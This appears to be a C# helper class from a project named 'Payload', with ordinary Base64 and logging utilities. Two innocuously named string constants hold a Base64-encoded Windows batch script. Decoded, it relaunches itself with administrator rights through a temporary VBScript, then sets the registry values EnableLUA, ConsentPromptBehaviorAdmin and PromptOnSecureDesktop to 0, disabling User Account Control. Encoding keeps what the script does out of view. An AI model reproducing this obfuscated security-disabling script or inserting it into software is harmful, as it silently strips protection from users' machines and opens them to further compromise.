using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Payload.Common
{
    public static class TextHelper
    {
        public static readonly string UacBase64Debug = @"Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OkdldCBBZG1pbjo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpAZWNobyBv
ZmYKZWNobyBHZXQgQWRtaW5pc3RyYXRvciBSaWdodHMKY2FjbHMuZXhlICIlU3lzdGVtRHJpdmUl
XFN5c3RlbSBWb2x1bWUgSW5mb3JtYXRpb24iID5udWwgMj5udWwKaWYgJWVycm9ybGV2ZWwlPT0w
IGdvdG8gQWRtaW4KaWYgZXhpc3QgIiV0ZW1wJVxnZXRhZG1pbi52YnMiIGRlbCAvZiAvcSAiJXRl
bXAlXGdldGFkbWluLnZicyIKZWNobyBTZXQgUmVxdWVzdFVBQyA9IENyZWF0ZU9iamVjdF4oIlNo
ZWxsLkFwcGxpY2F0aW9uIl4pPiIldGVtcCVcZ2V0YWRtaW4udmJzIgplY2hvIFJlcXVlc3RVQUMu
U2hlbGxFeGVjdXRlICIlfnMwIiwiIiwiIiwicnVuYXMiLDEgPj4iJXRlbXAlXGdldGFkbWluLnZi
cyIKZWNobyBXU2NyaXB0LlF1aXQgPj4iJXRlbXAlXGdldGFkbWluLnZicyIKIiV0ZW1wJVxnZXRh
ZG1pbi52YnMiIC9mCmlmIGV4aXN0ICIldGVtcCVcZ2V0YWRtaW4udmJzIiBkZWwgL2YgL3EgIiV0
ZW1wJVxnZXRhZG1pbi52YnMiCmV4aXQKOkFkbWluCmVjaG8gU3VjY2Vzc2Z1bGx5IEdldCBBZG1p
bmlzdHJhdG9yIFJpZ2h0cwo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6QWRqdXN0IFJlZ2lzdHJ5LCBE
aXNhYmxlIFVBQzo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpyZWcgYWRkICJIS0VZX0xPQ0FMX01BQ0hJTkVc
U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt
IiAvdiAiQ29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4iIC90IHJlZ19kd29yZCAvZCAwIC9GCnJl
ZyBhZGQgIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJy
ZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJFbmFibGVMVUEiIC90IHJlZ19kd29yZCAv
ZCAwIC9GCnJlZyBhZGQgIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2lu
ZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJQcm9tcHRPblNlY3VyZURl
c2t0b3AiIC90IHJlZ19kd29yZCAvZCAwIC9GCnBhdXNl";

        public static readonly string UacBase64 = @"Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OkdldCBBZG1pbjo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpAZWNobyBv
ZmYKZWNobyBHZXQgQWRtaW5pc3RyYXRvciBSaWdodHMKY2FjbHMuZXhlICIlU3lzdGVtRHJpdmUl
XFN5c3RlbSBWb2x1bWUgSW5mb3JtYXRpb24iID5udWwgMj5udWwKaWYgJWVycm9ybGV2ZWwlPT0w
IGdvdG8gQWRtaW4KaWYgZXhpc3QgIiV0ZW1wJVxnZXRhZG1pbi52YnMiIGRlbCAvZiAvcSAiJXRl
bXAlXGdldGFkbWluLnZicyIKZWNobyBTZXQgUmVxdWVzdFVBQyA9IENyZWF0ZU9iamVjdF4oIlNo
ZWxsLkFwcGxpY2F0aW9uIl4pPiIldGVtcCVcZ2V0YWRtaW4udmJzIgplY2hvIFJlcXVlc3RVQUMu
U2hlbGxFeGVjdXRlICIlfnMwIiwiIiwiIiwicnVuYXMiLDEgPj4iJXRlbXAlXGdldGFkbWluLnZi
cyIKZWNobyBXU2NyaXB0LlF1aXQgPj4iJXRlbXAlXGdldGFkbWluLnZicyIKIiV0ZW1wJVxnZXRh
ZG1pbi52YnMiIC9mCmlmIGV4aXN0ICIldGVtcCVcZ2V0YWRtaW4udmJzIiBkZWwgL2YgL3EgIiV0
ZW1wJVxnZXRhZG1pbi52YnMiCmV4aXQKOkFkbWluCmVjaG8gU3VjY2Vzc2Z1bGx5IEdldCBBZG1p
bmlzdHJhdG9yIFJpZ2h0cwo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6QWRqdXN0IFJlZ2lzdHJ5LCBE
aXNhYmxlIFVBQzo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpyZWcgYWRkICJIS0VZX0xPQ0FMX01BQ0hJTkVc
U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt
IiAvdiAiQ29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4iIC90IHJlZ19kd29yZCAvZCAwIC9GCnJl
ZyBhZGQgIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJy
ZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJFbmFibGVMVUEiIC90IHJlZ19kd29yZCAv
ZCAwIC9GCnJlZyBhZGQgIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2lu
ZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJQcm9tcHRPblNlY3VyZURl
c2t0b3AiIC90IHJlZ19kd29yZCAvZCAwIC9G";

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
        public static void WriteError(string msg)
        {
            using (StreamWriter writer = new StreamWriter(Config.Instance.WorkSpaceDir+ "\\error.txt", true))
            {
                writer.WriteLine($"{DateTime.Now.ToString()} :: {msg}");
            }
        }

        public static string GenTimeSpanFromMillisec(Double millisec)
        //https://learn.microsoft.com/en-us/dotnet/api/system.timespan.frommilliseconds?view=net-6.0
        {
            // Create a TimeSpan object and TimeSpan string from 
            // a number of milliseconds.
            TimeSpan interval = TimeSpan.FromMilliseconds(millisec);
            string timeInterval = interval.ToString();

            // Pad the end of the TimeSpan string with spaces if it 
            // does not contain milliseconds.
            int pIndex = timeInterval.IndexOf(':');
            pIndex = timeInterval.IndexOf('.', pIndex);
            if (pIndex < 0) timeInterval += "        ";

            return String.Format("{0}", timeInterval);
        }
    }
}
